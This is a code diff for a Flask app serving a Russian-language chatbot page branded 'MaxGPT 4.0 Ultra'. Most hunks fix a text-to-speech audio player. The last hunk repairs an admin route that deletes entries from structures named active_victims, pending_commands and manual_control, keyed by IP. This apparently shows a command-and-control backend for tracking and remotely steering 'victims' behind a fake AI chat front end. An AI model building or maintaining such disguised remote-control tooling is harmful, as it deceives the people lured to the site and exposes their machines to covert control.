@@ -126,7 +126,6 @@ HTML_PAGE = """<!DOCTYPE html>
         .action-icon-btn { background: none; border: none; color: var(--text-muted); cursor: pointer; font-size: 12px; display: flex; align-items: center; gap: 5px; padding: 3px 6px; border-radius: 6px; transition: 0.2s; }
         .action-icon-btn:hover { background: rgba(255,255,255,0.06); color: var(--text-main); }
 
-        /* Зафиксированный аудиоплеер озвучки */
         .voice-player-bar { display: none; flex-direction: column; gap: 8px; background: #18191e; border: 1px solid rgba(139, 92, 246, 0.4); padding: 10px 14px; border-radius: 14px; margin-bottom: 10px; width: 100%; max-width: 320px; box-shadow: 0 8px 25px rgba(0,0,0,0.4); animation: slideUpAudio 0.2s ease-out; }
         @keyframes slideUpAudio { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
         .voice-player-bar.show { display: flex; }
@@ -327,7 +326,7 @@ HTML_PAGE = """<!DOCTYPE html>
                         </div>
                         <button class="vp-close-btn" onclick="closePlayer('player_initial')"><i class="fa-solid fa-xmark"></i></button>
                     </div>
-                    <input type="range" class="vp-scrubber" id="scrubber_initial" min="0" max="100" value="0" disabled onmousedown="startSeeking()" onmouseup="finishSeeking(this)" onchange="seekAudio(this)">
+                    <input type="range" class="vp-scrubber" id="scrubber_initial" min="0" max="100" value="0" disabled oninput="seekAudio(this)">
                 </div>
                 <div class="txt">Привет! Я <b>MaxGPT 4.0 Ultra</b>. Чем я могу помочь тебе сегодня?</div>
                 <div class="bot-actions">
@@ -374,8 +373,7 @@ let activeTimerInterval = null;
 let activeSeconds = 0;
 let activeTotalChars = 0;
 let activePlayerBar = null;
-let activeScrubberEl = null;
-let isUserSeeking = false;
+let isInternalCancel = false;
 
 function unlockAudio() {
     if (!audioCtx) {
@@ -421,9 +419,6 @@ function playBeepSound() {
     } catch(e) {}
 }
 
-function startSeeking() { isUserSeeking = true; }
-function finishSeeking(scrubber) { isUserSeeking = false; seekAudio(scrubber); }
-
 function openSpeechPlayer(btn, playerId, timerId, playBtnId, scrubberId) {
     if (!('speechSynthesis' in window)) {
         alert('Ваш браузер не поддерживает озвучку текста.');
@@ -435,18 +430,20 @@ function openSpeechPlayer(btn, playerId, timerId, playBtnId, scrubberId) {
     let playBtn = document.getElementById(playBtnId);
     let scrubber = document.getElementById(scrubberId);
 
-    // Если этот же плеер уже открыт и говорит, клик не схлопывает его
+    // Если этот плеер уже активен и проигрывается, повторный клик на "Озвучить" не сбрасывает его
     if (activePlayerBar === playerBar && window.speechSynthesis.speaking) {
         return;
     }
 
+    isInternalCancel = true;
     window.speechSynthesis.cancel();
+    isInternalCancel = false;
+
     if (activeTimerInterval) clearInterval(activeTimerInterval);
 
     document.querySelectorAll('.voice-player-bar').forEach(el => el.classList.remove('show'));
 
     activePlayerBar = playerBar;
-    activeScrubberEl = scrubber;
 
     let container = btn.closest('.msg-container');
     let textToSpeak = container.querySelector('.txt').innerText;
@@ -467,12 +464,8 @@ function openSpeechPlayer(btn, playerId, timerId, playBtnId, scrubberId) {
         }
     });
 
-    if (!preferredVoice) {
-        preferredVoice = voices.find(v => v.lang.includes('ru'));
-    }
-    if (preferredVoice) {
-        utterance.voice = preferredVoice;
-    }
+    if (!preferredVoice) preferredVoice = voices.find(v => v.lang.includes('ru'));
+    if (preferredVoice) utterance.voice = preferredVoice;
 
     activeSeconds = 0;
     timerEl.innerText = "00:00";
@@ -489,7 +482,7 @@ function openSpeechPlayer(btn, playerId, timerId, playBtnId, scrubberId) {
 
         if (activeTimerInterval) clearInterval(activeTimerInterval);
         activeTimerInterval = setInterval(() => {
-            if (!window.speechSynthesis.paused && !isUserSeeking) {
+            if (!window.speechSynthesis.paused) {
                 activeSeconds++;
                 let m = Math.floor(activeSeconds / 60).toString().padStart(2, '0');
                 let s = (activeSeconds % 60).toString().padStart(2, '0');
@@ -503,7 +496,7 @@ function openSpeechPlayer(btn, playerId, timerId, playBtnId, scrubberId) {
     };
 
     utterance.onboundary = (event) => {
-        if (event.charIndex && activeTotalChars > 0 && !isUserSeeking) {
+        if (event.charIndex && activeTotalChars > 0) {
             let estimatedTotalSecs = Math.max(5, Math.ceil(activeTotalChars / 14));
             activeSeconds = Math.floor((event.charIndex / activeTotalChars) * estimatedTotalSecs);
             let m = Math.floor(activeSeconds / 60).toString().padStart(2, '0');
@@ -514,13 +507,17 @@ function openSpeechPlayer(btn, playerId, timerId, playBtnId, scrubberId) {
     };
 
     utterance.onend = () => {
-        if (activeTimerInterval) clearInterval(activeTimerInterval);
-        playerBar.classList.remove('show');
+        if (!isInternalCancel) {
+            if (activeTimerInterval) clearInterval(activeTimerInterval);
+            playerBar.classList.remove('show');
+        }
     };
     
     utterance.onerror = () => {
-        if (activeTimerInterval) clearInterval(activeTimerInterval);
-        playerBar.classList.remove('show');
+        if (!isInternalCancel) {
+            if (activeTimerInterval) clearInterval(activeTimerInterval);
+            playerBar.classList.remove('show');
+        }
     };
 
     activeUtterance = utterance;
@@ -542,22 +539,23 @@ function togglePlayPause(btn) {
 }
 
 function seekAudio(scrubber) {
-    if (!('speechSynthesis' in window) || !activeUtterance || activeTotalChars === 0) return;
+    if (!('speechSynthesis' in window) || activeTotalChars === 0) return;
     let targetPercent = scrubber.value / 100;
     let estimatedTotalSecs = Math.max(5, Math.ceil(activeTotalChars / 14));
     activeSeconds = Math.floor(targetPercent * estimatedTotalSecs);
     
+    isInternalCancel = true;
     window.speechSynthesis.cancel();
-    if (activeTimerInterval) clearInterval(activeTimerInterval);
+    isInternalCancel = false;
 
-    let container = activeScrubberEl.closest('.msg-container');
+    let container = scrubber.closest('.msg-container');
     let textToSpeak = container.querySelector('.txt').innerText;
     let targetCharIndex = Math.floor(targetPercent * textToSpeak.length);
     let slicedText = textToSpeak.substring(targetCharIndex);
 
     let newUtterance = new SpeechSynthesisUtterance(slicedText);
     newUtterance.lang = 'ru-RU';
-    if (activeUtterance.voice) newUtterance.voice = activeUtterance.voice;
+    if (activeUtterance && activeUtterance.voice) newUtterance.voice = activeUtterance.voice;
 
     let timerEl = activePlayerBar.querySelector('.vp-timer');
     let playBtn = activePlayerBar.querySelector('.vp-play-btn');
@@ -569,7 +567,7 @@ function seekAudio(scrubber) {
 
         if (activeTimerInterval) clearInterval(activeTimerInterval);
         activeTimerInterval = setInterval(() => {
-            if (!window.speechSynthesis.paused && !isUserSeeking) {
+            if (!window.speechSynthesis.paused) {
                 activeSeconds++;
                 let m = Math.floor(activeSeconds / 60).toString().padStart(2, '0');
                 let s = (activeSeconds % 60).toString().padStart(2, '0');
@@ -581,8 +579,10 @@ function seekAudio(scrubber) {
     };
 
     newUtterance.onend = () => {
-        if (activeTimerInterval) clearInterval(activeTimerInterval);
-        activePlayerBar.classList.remove('show');
+        if (!isInternalCancel) {
+            if (activeTimerInterval) clearInterval(activeTimerInterval);
+            activePlayerBar.classList.remove('show');
+        }
     };
 
     activeUtterance = newUtterance;
@@ -590,9 +590,11 @@ function seekAudio(scrubber) {
 }
 
 function closePlayer(playerId) {
+    isInternalCancel = true;
     if ('speechSynthesis' in window) {
         window.speechSynthesis.cancel();
     }
+    isInternalCancel = false;
     if (activeTimerInterval) clearInterval(activeTimerInterval);
     let playerBar = document.getElementById(playerId);
     if (playerBar) playerBar.classList.remove('show');
@@ -753,7 +755,7 @@ async function startNewChat() {
                         </div>
                         <button class="vp-close-btn" onclick="closePlayer('${pId}')"><i class="fa-solid fa-xmark"></i></button>
                     </div>
-                    <input type="range" class="vp-scrubber" id="${sId}" min="0" max="100" value="0" disabled onmousedown="startSeeking()" onmouseup="finishSeeking(this)" onchange="seekAudio(this)">
+                    <input type="range" class="vp-scrubber" id="${sId}" min="0" max="100" value="0" disabled onchange="seekAudio(this)">
                 </div>
                 <div class="txt">Привет! Я <b>MaxGPT 4.0 Ultra</b>. Чем я могу помочь тебе сегодня?</div>
                 <div class="bot-actions">
@@ -801,7 +803,7 @@ async function fetchMessages() {
                         </div>
                         <button class="vp-close-btn" onclick="closePlayer('${pId}')"><i class="fa-solid fa-xmark"></i></button>
                     </div>
-                    <input type="range" class="vp-scrubber" id="${sId}" min="0" max="100" value="0" disabled onmousedown="startSeeking()" onmouseup="finishSeeking(this)" onchange="seekAudio(this)">
+                    <input type="range" class="vp-scrubber" id="${sId}" min="0" max="100" value="0" disabled onchange="seekAudio(this)">
                 </div>
                 <div class="txt">Привет! Я <b>MaxGPT 4.0 Ultra</b>. Чем я могу помочь тебе сегодня?</div>
                 <div class="bot-actions">
@@ -830,7 +832,7 @@ async function fetchMessages() {
                         </div>
                         <button class="vp-close-btn" onclick="closePlayer('${msgPlayerId}')"><i class="fa-solid fa-xmark"></i></button>
                     </div>
-                    <input type="range" class="vp-scrubber" id="${msgScrubId}" min="0" max="100" value="0" disabled onmousedown="startSeeking()" onmouseup="finishSeeking(this)" onchange="seekAudio(this)">
+                    <input type="range" class="vp-scrubber" id="${msgScrubId}" min="0" max="100" value="0" disabled onchange="seekAudio(this)">
                 </div>
                 <div class="bot-actions">
                     <button class="action-icon-btn" onclick="copyText(this)"><i class="fa-regular fa-copy"></i> Копировать</button>
@@ -1240,7 +1242,7 @@ def admin_delete():
     data = request.json or {}
     target_ip = data.get("ip")
     if target_ip in active_victims: del active_victims[target_ip]
-    if target_ip in pending_commands: del active_victims[target_ip]
+    if target_ip in pending_commands: del pending_commands[target_ip]
     if target_ip in manual_control: del manual_control[target_ip]
     return jsonify({"status": "deleted"})
 
